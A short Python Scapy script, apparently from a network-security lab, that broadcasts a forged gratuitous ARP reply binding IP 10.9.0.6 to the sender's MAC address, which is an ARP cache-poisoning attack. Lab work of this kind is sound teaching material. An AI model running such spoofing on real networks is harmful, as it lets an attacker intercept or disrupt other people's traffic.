#!/usr/bin/python3
from scapy.all import *
 
E = Ether(dst = 'ff:ff:ff:ff:ff:ff', src = '02:42:0a:09:00:69')
A = ARP(op=2,hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6',hwdst='ff:ff:ff:ff:ff:ff', pdst='10.9.0.6')
pkt = E/A
pkt.show()
sendp(pkt)
